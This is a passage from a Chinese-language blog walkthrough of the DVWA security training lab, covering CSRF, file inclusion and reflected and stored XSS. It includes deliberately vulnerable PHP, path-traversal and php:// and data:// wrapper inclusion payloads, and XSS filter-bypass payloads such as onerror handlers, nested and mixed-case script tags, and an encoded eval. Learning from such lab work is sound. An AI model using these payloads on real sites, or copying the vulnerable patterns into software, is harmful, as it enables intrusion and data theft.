class="literal">false</span> <span class="title function_ invoke__">stripos</span>(<span class="keyword">string</span> <span class="variable">$haystack</span>, <span class="keyword">string</span> <span class="variable">$needle</span>[, <span class="keyword">int</span> <span class="variable">$offset</span> = <span class="number">0</span>])</span><br></pre></td></tr></table></figure><p>参数解释：</p><ul><li><code>$haystack</code>：要搜索的原始字符串。</li><li><code>$needle</code>：要查找的子字符串。</li><li><code>$offset</code>（可选）：指定搜索的起始位置，默认为0。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&quot;Hello, World!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$position1</span> = <span class="title function_ invoke__">stripos</span>(<span class="variable">$str</span>, <span class="string">&quot;world&quot;</span>);  <span class="comment">// 不区分大小写查找</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$position1</span>;  <span class="comment">// 输出: 7</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$position2</span> = <span class="title function_ invoke__">stripos</span>(<span class="variable">$str</span>, <span class="string">&quot;o&quot;</span>);  <span class="comment">// 不区分大小写查找</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$position2</span>;  <span class="comment">// 输出: 4</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$position3</span> = <span class="title function_ invoke__">stripos</span>(<span class="variable">$str</span>, <span class="string">&quot;Hello&quot;</span>, <span class="number">7</span>);  <span class="comment">// 从索引7开始查找</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$position3</span>;  <span class="comment">// 输出: false</span></span><br></pre></td></tr></table></figure><p>如果要进行大小写敏感的查找，请使用<code>strpos()</code>函数。它与<code>stripos()</code>函数的使用方法类似，但是区分大小写。</p></blockquote><p>​    我们当然可以自己手动用burp等工具添加referer头信息，从而成功修改密码，但是受害者不会做这种事情。CSRF的本质还是受害者在登陆状态下访问了我们伪造的页面链接后被getshell的情况。</p><p>​    详情参考：<a class="link" href="https://www.sqlsec.com/2020/05/dvwa.html#Medium-2">click here<i class="fas fa-external-link-alt"></i></a></p><h2 id="High-2"><a href="#High-2" class="headerlink" title="High"></a>High</h2><p>同样的流程，不同的Url：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/DVWA/vulnerabilities/csrf/?password_new=admin&amp;password_conf=admin&amp;Change=Change&amp;user_token=3e3af1b6dbc164ac259ea1273e2e8907#</span><br></pre></td></tr></table></figure><p>看来是加入了<code>token验证机制</code></p><p>思路是：使用 XSS 来获取用户的 token ，然后将 token 放到 CSRF 的请求中。</p><p>详情请参考：<a class="link" href="https://www.sqlsec.com/2020/05/dvwa.html#High-2">click here<i class="fas fa-external-link-alt"></i></a></p><h2 id="Impossible-2"><a href="#Impossible-2" class="headerlink" title="Impossible"></a>Impossible</h2><p>看下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Check that the current password is correct</span></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">&#x27;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );</span><br><span class="line"><span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:user&#x27;</span>, <span class="title function_ invoke__">dvwaCurrentUser</span>(), PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line"><span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:password&#x27;</span>, <span class="variable">$pass_curr</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line"><span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br></pre></td></tr></table></figure><p>学到了，安全地防注入。</p><p>此难度主要是采用了主流的验证当前密码是否正确后才能修改密码，而且也有<code>token验证机制</code>，安全性杠杠的。</p><h1 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h1><h2 id="文件包含漏洞简介"><a href="#文件包含漏洞简介" class="headerlink" title="文件包含漏洞简介"></a>文件包含漏洞简介</h2><blockquote><p>文件包含漏洞（File Inclusion Vulnerability）是一种常见的安全漏洞，出现在许多服务器端编程语言和Web应用程序中。该漏洞允许攻击者在应用程序中动态包含本地或远程文件，可能导致恶意代码执行、敏感信息泄露、服务器被控制等严重后果。</p><p>文件包含漏洞通常发生在以下两种情况下：</p><ol><li>本地文件包含（Local File Inclusion，LFI）：攻击者能够通过应用程序动态包含本地文件系统中的文件。这些文件可以是服务器上的敏感配置文件、用户数据、操作系统文件等。</li><li>远程文件包含（Remote File Inclusion，RFI）：攻击者能够通过应用程序动态包含远程服务器上的文件。攻击者可以利用这个漏洞加载恶意脚本或远程文件，从而控制受攻击的系统。</li></ol><p>文件包含漏洞通常发生在应用程序中将用户提供的输入直接用作文件路径或文件名的地方，而没有进行充分的验证、过滤或限制。攻击者利用这个漏洞可以构造恶意的文件路径，从而获取敏感信息、执行任意代码或进行远程命令执行。</p></blockquote><h2 id="Mine"><a href="#Mine" class="headerlink" title="Mine"></a>Mine</h2><blockquote><p>由于我之前没有学过FI相应漏洞的原理这里我在我的本地搭建了这样的程序:</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&quot;go away hacker!&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]))</span><br><span class="line">&#123;    </span><br><span class="line">    <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]; <span class="comment">// 获取用户提供的页面参数</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$page</span> . <span class="string">&#x27;.php&#x27;</span>); <span class="comment">// 动态包含用户指定的页面</span></span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//同属于test.php目录下有个flag文件：</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$flag</span>=<span class="string">&#x27;win7&#123;you get flag!&#125;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//属于test.php上级目录ctf下的flag文件：</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$flag</span>=<span class="string">&#x27;you got another flag!&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span>    </span><br></pre></td></tr></table></figure><p>读取test.php目录下的flag文件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=flag</span><br></pre></td></tr></table></figure><p>读取test.php上级目录ctf下的flag文件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=../flag</span><br></pre></td></tr></table></figure><h2 id="Low-3"><a href="#Low-3" class="headerlink" title="Low"></a>Low</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// if( count( $_GET ) )</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$file</span> ) )</span><br><span class="line"><span class="keyword">include</span>( <span class="variable">$file</span> );</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>( <span class="string">&#x27;Location:?page=include.php&#x27;</span> );</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?page=flag.php</span><br><span class="line">?page=file4.php</span><br></pre></td></tr></table></figure><h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?page=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line">?page=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line">?page=data:text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">?page=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+</span><br><span class="line">?page=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br><span class="line">//对于此条如果直接拉到URL里面是访问不成功的因为URL编码会认为+是空格所以我们用URL编码中的%2b来代替</span><br></pre></td></tr></table></figure><h1 id="XSS-Reflected"><a href="#XSS-Reflected" class="headerlink" title="XSS (Reflected)"></a>XSS (Reflected)</h1><blockquote><p>反射型跨站脚本（Reflected Cross-site Scripting）也称作非持久型、参数型跨站脚本。反射型 XSS 只是简单地把用户输入的数据 “反射” 给浏览器。也就是说，黑客往往需要诱使用户 “点击” 一个恶意链接，才能攻击成功。</p><p>反射型 XSS的特点是只在用户浏览时触发，而且只执行一次，非持久化，所以称为反射型 XSS,不过随着技术的发展，我们可以将包含漏洞的链接通过<strong>短网址缩短</strong>或者<strong>转换为二维码</strong>等形式灵活运用。</p></blockquote><h2 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h2><blockquote><p>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型：</p><ul><li>反射性XSS</li><li>存储型XSS</li><li>DOM型XSS</li></ul><p>由于XSS这块我之前也没有学过，故在这个模块我会学的扎实一点！</p></blockquote><h2 id="Low-4"><a href="#Low-4" class="headerlink" title="Low"></a>Low</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">//后端</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">header (&quot;X-XSS-Protection: 0&quot;);</span><br><span class="line"></span><br><span class="line">// Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123;</span><br><span class="line">// Feedback for end user</span><br><span class="line">$html .= &#x27;&lt;pre&gt;Hello &#x27; . $_GET[ &#x27;name&#x27; ] . &#x27;&lt;/pre&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">//前端</span><br><span class="line">&lt;form name=&quot;XSS&quot; action=&quot;#&quot; method=&quot;GET&quot;&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">    What&#x27;s your name?</span><br><span class="line">    &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>可以看到对 <code>name</code> 变量没有任何过滤措施，只单纯地检测了是否存在且不为空，就直接输出到网页。所以我们直接输入：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="Medium-3"><a href="#Medium-3" class="headerlink" title="Medium"></a>Medium</h2><p>依葫芦画瓢，结果输出：<code>Hello alert(&#39;XSS&#39;)</code></p><p>说明已经有了黑名单。</p><p>初步试验应该是过滤了<code>&lt;script&gt;</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"><span class="comment">// Feedback for end user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Hello <span class="subst">&#123;$name&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230708/St2iv8rimage.6ui6ls1fzg00.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&quot;Hello, World!&quot;</span>;</span><br><span class="line"><span class="variable">$newStr</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;World&quot;</span>, <span class="string">&quot;Universe&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$newStr</span>;  <span class="comment">// 输出: Hello, Universe!</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$old</span> = <span class="keyword">array</span>(<span class="string">&quot;blue&quot;</span>, <span class="string">&quot;red&quot;</span>, <span class="string">&quot;green&quot;</span>);</span><br><span class="line"><span class="variable">$new</span> = <span class="keyword">array</span>(<span class="string">&quot;orange&quot;</span>, <span class="string">&quot;purple&quot;</span>, <span class="string">&quot;yellow&quot;</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;The sky is blue.&quot;</span>;</span><br><span class="line"><span class="variable">$newStr</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$old</span>, <span class="variable">$new</span>, <span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$newStr</span>;  <span class="comment">// 输出: The sky is orange.</span></span><br></pre></td></tr></table></figure><p><mark>str_replace()函数对大小写敏感</mark></p><h3 id="使用其他的标签通过事件来弹窗绕过"><a href="#使用其他的标签通过事件来弹窗绕过" class="headerlink" title="使用其他的标签通过事件来弹窗绕过"></a>使用其他的标签通过事件来弹窗绕过</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)&gt;</span><br></pre></td></tr></table></figure><blockquote><ul><li><code>&lt;img&gt;</code>标签：这是一个HTML图像标签，用于在网页中显示图像。在这个例子中，它用作XSS注入的载体。</li><li><code>src</code>属性：该属性指定了图像的URL或路径。在这个例子中，我们将其设置为简单的字符 <code>&#39;x&#39;</code>，它并没有实际存在的图像文件。</li><li><code>onerror</code>属性：这是<code>&lt;img&gt;</code>标签的一个事件属性。它定义了在加载图像时发生错误时要执行的JavaScript代码。</li><li><code>alert(&#39;XSS&#39;)</code>：这是在<code>onerror</code>属性中执行的恶意JavaScript代码。<code>alert()</code>函数用于显示一个弹窗，其中包含字符串 <code>&#39;XSS&#39;</code>。</li></ul></blockquote><h3 id="嵌套构造绕过"><a href="#嵌套构造绕过" class="headerlink" title="嵌套构造绕过"></a>嵌套构造绕过</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;s&lt;script&gt;cript&gt;<span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="大写绕过"><a href="#大写绕过" class="headerlink" title="大写绕过"></a>大写绕过</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">Script</span>&gt;<span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="High-3"><a href="#High-3" class="headerlink" title="High"></a>High</h2><p>发现嵌套和大写都绕不过了但是使用其他的标签通过事件来弹窗还可以绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for end user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Hello <span class="subst">&#123;$name&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>详细解释一下黑名单：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br></pre></td></tr></table></figure><blockquote><p>在正则表达式中，<code>(.*)</code>是一个常见的模式，用于匹配任意字符的序列。</p><p>具体来说，<code>(.*)</code>由两部分组成：</p><ul><li><code>.</code>：表示匹配任意字符，除了换行符 <code>\n</code>。</li><li><code>*</code>：表示匹配前面的元素（这里是<code>.</code>）零次或多次。</li></ul><p>因此，<code>(.*)</code>可以匹配任意长度的字符序列，包括空字符串。</p></blockquote><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230708/St2iv8rimage.2c8wkqdbl21w.png"></p><h3 id="Payloads"><a href="#Payloads" class="headerlink" title="Payloads"></a>Payloads</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="number">1</span> onerror=<span class="built_in">eval</span>(<span class="string">&quot;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&quot;</span>)&gt;&lt;/img&gt;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=<span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)&gt;</span><br></pre></td></tr></table></figure><blockquote><ul><li><code>&lt;iframe&gt;</code>标签：这是一个HTML的内联框架标签，用于在页面中嵌入其他文档或网页。</li><li><code>onload</code>属性：这是<code>&lt;iframe&gt;</code>标签的一个事件属性，用于在加载内联框架内容时触发指定的JavaScript代码。</li><li><code>alert(&#39;XSS&#39;)</code>：这是在<code>onload</code>事件中执行的恶意JavaScript代码。<code>alert()</code>函数用于显示一个弹窗，其中包含字符串 <code>&#39;XSS&#39;</code>。</li></ul><p>当这个恶意的payload被插入到一个Web页面中并加载时，浏览器会加载<code>&lt;iframe&gt;</code>标签中指定的内容，并在加载完成后触发<code>onload</code>事件。这时，恶意的JavaScript代码<code>alert(&#39;XSS&#39;)</code>会执行，弹出一个显示字符串 <code>&#39;XSS&#39;</code>的警告框。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;object data=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;&lt;/object&gt;</span><br></pre></td></tr></table></figure><blockquote><p>这个例子是一个基于data URL的XSS（跨站脚本攻击）注入的payload，它使用了<code>&lt;object&gt;</code>标签来加载一个data URL，并在其中嵌入了恶意的JavaScript代码。</p><ul><li><code>&lt;object&gt;</code>标签：这是一个HTML标签，用于嵌入对象（如媒体文件、插件等）到页面中。</li><li><code>data</code>属性：这是<code>&lt;object&gt;</code>标签的一个属性，指定要加载的对象的数据源。</li><li><code>data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=</code>：这是data URL，它以<code>data:</code>开头，后面跟着MIME类型（<code>text/html</code>）和编码方式（<code>base64</code>）。接着是经过Base64编码的HTML和JavaScript代码。</li><li><code>PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=</code>：这是经过Base64编码的恶意代码。解码后的代码是<code>&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</code>，它用于在页面中执行恶意的JavaScript代码。</li></ul><p>当这个恶意的payload被插入到一个Web页面中并加载时，浏览器会加载<code>&lt;object&gt;</code>标签中指定的data URL，并尝试解析其中的HTML内容。在这个例子中，解析的内容是经过Base64编码的HTML和JavaScript代码。</p><p>解码后的HTML代码是<code>&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</code>，其中包含了一个<code>&lt;script&gt;</code>标签和一个<code>alert()</code>函数的调用。当浏览器解析到这段代码时，恶意的JavaScript代码会执行，弹出一个显示字符串 <code>&#39;XSS&#39;</code>的警告框。</p></blockquote><h2 id="Impossible-3"><a href="#Impossible-3" class="headerlink" title="Impossible"></a>Impossible</h2><p>看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line"><span class="comment">// Check Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"><span class="comment">// Feedback for end user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Hello <span class="subst">&#123;$name&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><code>htmlspecialchars()</code>：这是一个PHP内置函数，用于将特殊字符转换为HTML实体编码。它的作用是确保特殊字符被正确显示，而不会被解析为HTML标签或执行恶意的JavaScript代码。</p></blockquote><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230708/St2iv8rimage.aiewa3znx4k.png"></p><p>学到了……就一个函数的事情，网页开发者用点心吧23333.</p><h1 id="XSS-Stored"><a href="#XSS-Stored" class="headerlink" title="XSS (Stored)"></a>XSS (Stored)</h1><h2 id="Low-5"><a href="#Low-5" class="headerlink" title="Low"></a>Low</h2><p>留一条<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，因为写在数据库里面了，每次访问留言板也就是该页面就会触发。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line"><span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitize message input</span></span><br><span class="line"><span class="variable">$message</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$message</span> );</span><br><span class="line"><span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span 